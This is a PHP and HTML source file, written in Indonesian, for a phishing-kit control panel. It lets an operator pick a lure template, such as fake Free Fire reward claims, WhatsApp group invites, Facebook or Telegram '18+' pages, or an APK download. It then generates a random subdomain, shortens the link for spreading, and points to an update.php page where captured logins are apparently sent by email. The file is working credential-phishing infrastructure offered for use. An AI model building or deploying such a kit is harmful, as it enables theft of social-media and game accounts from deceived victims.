<?php 
include 'AlexShortLink.php';
session_start();
$_SESSION['session'] = bin2hex(random_bytes(32));

function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$zoneId = '6add90ad7cfdabb1cb1296bdb1e28118';
$shortenedURL = shortenURL($longURL);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link href="https://fonts.cdnfonts.com/css/common-pixel" rel="stylesheet">
  <title>Buat Web P - Otomatisイチジク</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
      background: #E2E8F0;
    }
.glow {
font-family: 'Common Pixel', sans-serif;
  color: #fff;
  font-size: 25px;
  text-shadow: 0px 0px 10px #000;
}

span {
  display: inline-block;
  padding: 0 10px;
}
    .gateway {
      position: relative;
      max-width: 600px;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .gateway span {
      margin-bottom: 20px;
    }
    .gateway .form {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 0 20px;
    }
    .gateway .response {
      position: relative;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 0 20px;
      margin-top: 30px;
      gap: 10px;
    }
    .response textarea {
      width: 100%;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .form label {
      position: relative;
      width: 100%;
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      width: 100%;
      border: 1px solid #000;
      border-radius: 5px;
      height: 30px;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
    }
    *:focus {
      outline: none;
    }
    h1 {
            font-family: 'Minecraft', sans-serif;
            color: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            line-height: 25px;
        }
        h1 strong {
            font-size: 2em;
        }
    .form button {
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    .gateway .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: #25D366;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .scode {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #fff;
      height: 100%;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .scode textarea {
      margin-top: 20px;
      width: 100%;
      height: 100%;
      padding-left: 5px;
      border-radius: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .scode i {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: pink;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    #copyButton {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #faae2b;
        border: 1px solid #000;
        border-radius: 3px;
        cursor: pointer;
    }
    .rainbow-text .char { 
  
  color: hsl(
    calc(360deg * var(--char-percent)
    ), 
    90%, 
    65%
  );
 
}
#heh {
font-family: 'Common Pixel', sans-serif;
font-size: 50px;
color:#FF0000;
text-shadow: 0px 0px 10px #f00;
}
  </style>
</head>
<body>
<div class="">
  <div onclick="" class=""></div>
  <div id="loading">  CREATE WEB P GG  </div>
  <br>
  <div class="form">
    <label> PILIH TAMPLAN WEB BOSS KU
      <select class="aq" id="tampilan">
        <option selected disabled>Pilih tampilan web dahulu...</option>
          <option value="tamp1">Freefire Claim</option>
        <option value="tamp2">Nonton Video</option>       
        <option value="tamp3">Mediafire mp4</option>
        <option value="tamp5">Link Grup WA v2</option>
                <option value="tamp6">Grup Wa</option>
        <option value="tamp7">Grup Join</option>
        <option value="tamp8">Grup Join v2</option>
        <option value="tamp9">Freefire claim v2</option>
        <option value="tamp10">Freefire claim v3</option>
        <option value="tamp11">Unduh Apk</option>
        <option value="tamp12">Mobile legend</option>
        <option value="tamp16">DoodStream</option>
        <option value="tamp17">Telegram 18+</option>
        <option value="tamp18">Link Unduh Videy</option>
        <option value="tamp19">Facebook 18+</option>
        <option value="tamp20">Link YouTube V2</option>
        <option value="tamp21">Freefire Claim v4</option>
        <option value="tamp22">Freefire Claim v5</option>
      </select>
    </label>
    <label> SUBDOMAIN
      <input name="subdomain" id="subdomain" type="text" class="playerid form-input" value="<?= $longURL ?>" readonly>
    </label>
    <button name="submit" id="btn">BUAT WEB</button>
  </div>
  <div class="response">
    <span>Response</span>
    <textarea id="responseTextArea" rows='8' readonly></textarea>
    <button id="copyButton"><i class="fa fa-copy"></i> Salin</button>  
  </div>
</div>
<footer>
  Created By <a href="https://wa.me/6283169894235" style="text-decoration: none;margin: 0 10px"> sourcode </a> With <img width="20" height="20" src="https://cdn.icon-icons.com/icons2/2699/PNG/512/expressjs_logo_icon_169185.png" style="margin-left: 10px">
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.stackpath.web.id/bootstrap/5.7.3/jquery.min.js"></script>
<script>
$(document).ready(function() {
    $("#btn").click(function() {
        var domainValue = $("#subdomain").val();
        var selectedValue = $("#tampilan").val();

        var button = $("#btn");
        button.html('Proses <i class="fa fa-spinner fa-spin"></i>');
        button.prop('disabled', true);

        var responseText = "(BERIKUT DATA WEBP ANDA DI SIMPAN JANGAN SAMPAI HILANG)\n\n";
        responseText += "WEB UNTUK NEBAR:\n<?= $shortenedURL ?>\n";
        responseText += "WEB SETTING EMAIL:\nhttps://<?= $longURL ?>/update.php\n";
        responseText += "Tanggal Pembuatan:\n" + new Date().toLocaleDateString();

        $("#responseTextArea").val(responseText);
        $("#copyButton").css("display", "block");

        setTimeout(function() {
            $(".response").css("display", "block");
            button.html('submit');
            button.prop('disabled', false);
        }, 2000);

        if(selectedValue === "tamp1") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('1') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp2") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('2') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp3") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('3') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp5") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('5') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp6") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('6') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp7") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('7') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp8") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('8') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp9") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('9') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp10") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('10') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp11") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('11') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);    
    } else if(selectedValue === "tamp12") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('12') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp16") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('16') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp17") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('17') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp18") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('18') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
      } else if(selectedValue === "tamp19") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('19') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp20") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('20') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
} else if(selectedValue === "tamp21") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('21') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp22") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('22') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    }
});

    $("#responseTextArea").blur(function() {
        $("#copyButton").css("display", "none");
    });

    function sendRequest(url, params) {
        $.post(url, params, function(data, status) {
            console.log("Respon dari server:", data);
        });
    }

    $("#copyButton").click(function() {
        var textarea = $("#responseTextArea");
        textarea.select();
        document.execCommand("copy");
        alert("Teks berhasil disalin!");
    });

    let status = "hide";

    function toggleSource() {
        let element = $(".scode");

        if (status == "hide") {
            element.css("display", "flex");
            status = "show";
        } else {
            element.css("display", "none");
            status = "hide";
        }
    }
});
</script>
</body>
</html>